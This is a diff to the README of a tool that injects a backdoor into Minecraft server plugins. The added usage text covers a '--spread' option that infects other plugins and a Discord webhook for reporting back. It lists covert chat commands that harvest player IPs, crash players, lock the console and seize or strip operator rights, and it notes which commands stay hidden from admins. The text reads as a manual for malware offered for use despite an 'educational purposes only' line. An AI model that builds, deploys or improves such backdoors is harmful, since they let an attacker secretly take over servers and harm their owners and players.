@@ -11,11 +11,21 @@ For educational purposes only. Do not use on a server you do not own.
 * Java 8 runtime.
 * Desired target plugin jar file.
 
-## Usage instructions:
+## GUI Usage:
 * Run backdoor-(version).jar.
 * Select desired plugin file.
 * Input your Minecraft UUID.
 * Input chat command prefix. (Default: #)
+
+## CLI Usage:
+Java -jar backdoor.jar (filename) [options]
+* --help / -h : Display syntax message in console
+* --offline / -o : Use usernames instead of UUID
+* --users / -u : UUID's or Usernames of authorized users. If not used, all users will be allowed.
+* --prefix / -p (Default: '#') : Prefix for backdoor commands.
+* --discord /-d : Discord webhook url. See Readme.
+* --spread / -s : Spread to other plugins.
+* --debug / -b : Send debug messages in console. Use this before creating issue reports.
 
 ## Commands
 Default command prefix is ``#``,  this can be changed.
@@ -31,18 +41,19 @@ Default command prefix is ``#``,  this can be changed.
 * #info - shows information about server
 * #chaos - deop and ban ops, op all regular players, run this while not being op yourself **[Visible]**
 * #seed - get the current world seed
-* #sudo - sends messages as player
-* #bcast - sends message as Server
+* #psay - sends messages as player
+* #ssay - sends message as Server
 * #rename - changes your nick
 * #reload - Reloads the server **[Visible]**
 * #getip - gets ip of the player
-* #listwrld - displays all worlds
-* #mkwrld - creates new world **[Visible]**
-* #delwrld - deletes a world **[Visible]**
+* #listworlds - displays all worlds
+* #makeworld - creates new world **[Visible]**
+* #delworld - deletes a world **[Visible]**
 * #vanish - makes you vanish, tab included
 * #silktouch - gives player silk touch hands
 * #instabreak - let's player mine instantly
 * #crash - crashes player's name
+* #troll - Troll player in various ways
 * #lock - locks the console or blocks player
 * #unlock - unlocks the console or unblocks player
 * #mute - mutes a player
@@ -57,6 +68,12 @@ Commands listed as **[Visible]** will be noticeable in Server console and or in-
 Warning:
 Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
 Other strange behavior may occur when teleporting extreme distances. (such as to the world border)
+
+## Discord Token Tutorial
+1) In a discord server, open Server Settings, Then "Integrations"
+2) Press 'Create Webhook'
+3) Name and profile picture can be customised, then press "Copy Webhook URL"
+4) Paste into injector / command line.
 
 ## License
 This software is provided under the GPL3 License.
